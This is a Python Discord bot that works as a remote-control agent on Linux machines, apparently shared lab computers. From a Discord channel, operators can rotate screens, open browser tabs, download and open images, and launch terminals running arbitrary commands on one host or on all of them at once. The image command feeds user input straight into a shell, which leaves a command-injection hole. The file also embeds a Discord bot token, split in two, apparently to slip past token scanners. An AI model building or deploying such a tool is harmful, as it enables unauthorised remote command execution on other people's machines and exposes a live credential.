import asyncio
import socket
import discord
import subprocess
import asyncio
import time
from discord.ext import commands

ID = socket.gethostname().split('.')[0]
intents = discord.Intents.all()
client = commands.Bot(command_prefix=">",
					  status=discord.Status.online,
					  intents=intents,
					  activity=discord.Activity(type=discord.ActivityType.listening, name=f"les piscineux"),
					  )

async def send_or_update_message(ctx, content):
	try:
		messages = [message async for message in ctx.channel.history(limit=1)]
		
		if messages and messages[0].author == client.user:
			last_message = messages[0]
			new_content = last_message.content + "\n" + content
			await last_message.edit(content=new_content)
		else:
			await ctx.send(content)
	except discord.errors.HTTPException as e:
		messages = [message async for message in ctx.channel.history(limit=1)]
		
		if messages and messages[0].author == client.user:
			last_message = messages[0]
			new_content = last_message.content + "\n" + content
			await last_message.edit(content=new_content)
		else:
			await asyncio.sleep(1)
			await ctx.send(content)

async def send_exit():
	channel = client.get_channel(1361783071535267880)
	if channel:
		await channel.send(f"❌ `[{ID}] DEACTIVATED !`")
	else:
		print("Channel not found!")

@client.event
async def on_ready():
	print("Starting !")
	channel = client.get_channel(1361783071535267880)
	if channel:
		await channel.send(f"✅ `[{ID}] ACTIVATED !`")
	else:
		print("Channel not found!")

@client.command()
async def ping(ctx, who):
	if (who == ID or who == "everyone"):
		await send_or_update_message(ctx, f"✅ `[{ID}]` -> `{client.latency}`")
	else:
		pass

@client.command()
async def screen(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			if (command in ["inverted", "normal", "right", "left"]):
				proc = await asyncio.create_subprocess_exec('xrandr', '--output', 'eDP', '--rotate', command)
				await proc.wait()
			else:
				await send_or_update_message(ctx, f"`[{ID}] invalid parameter : {command}`")
				return
			await send_or_update_message(ctx, f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def firefox(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			await asyncio.create_subprocess_exec('firefox', '--new-tab', command)
			await send_or_update_message(ctx, f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def img(ctx, who, command):
	if (who == ID or who == "everyone"):
		try:
			proc = await asyncio.create_subprocess_shell(f'curl "{command}" -o img.jpg')
			await proc.wait()
			await asyncio.create_subprocess_exec('xdg-open', 'img.jpg')
			await send_or_update_message(ctx, f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def shell_loop(ctx, who, number: int, *command):
	if (who == ID or who == "everyone"):
		try:
			for i in range(number):
				await asyncio.create_subprocess_exec('xterm', '-geometry', '50x20', '-fa', 'Monospace', '-fs', '18', '-e', ' '.join(command))
				await asyncio.sleep(0.5)
			await send_or_update_message(ctx, f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def shell(ctx, who, *command):
	if (who == ID or who == "everyone"):
		try:
			await asyncio.create_subprocess_exec('xterm', '-geometry', '50x20', '-fa', 'Monospace', '-fs', '18', '-e', ' '.join(command))
			await send_or_update_message(ctx, f"`[{ID}] command correctly processed !`")
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

@client.command()
async def exit(ctx, who):
	if (who == ID or who == "everyone"):
		try:
			await send_exit()
			await client.close()
		except Exception as e:
			await send_or_update_message(ctx, f"`[{ID}] an error occured :` ```{e}```")
	else:
		pass

p2 = ".8pGM_ULYbbDcv-o6Ov0NXy2hTXYImHZxELavBM"

async def main():
	async with client:
		await client.start("MTM2MTc4MTk4NTY2NzcxMTAzNw.GJoN_x" + p2)

try:
	asyncio.run(main())
except KeyboardInterrupt:
	print("stopped")
except Exception as e:
	asyncio.run(send_exit())
	print(f"Error: {e}")
